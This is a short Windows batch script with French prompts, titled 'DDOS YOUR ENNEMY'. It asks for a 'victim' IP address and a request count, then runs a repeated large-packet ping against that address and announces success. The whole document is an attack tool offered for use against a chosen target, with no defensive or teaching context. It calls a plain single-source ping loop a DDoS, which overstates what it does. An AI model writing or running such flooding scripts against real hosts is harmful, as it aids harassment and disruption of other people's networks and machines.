@echo off
title DDOS YOUR ENNEMY

:Questions
set /P victim="Quel est l'adresse ip de la victime? > "
cls
set /P requests="Combien de requetes faut il envoyer a %victim% ? > "
cls
title Envoie en cours de %requests% requetes a %victim%...
color 47
ping %victim% -n %requests% -l 1000
title Operation finie !
timeout 5 /nobreak
cls
title Fin.
color 27
echo L'adresse %victim% a eu %requests% requetes avec succes !
pause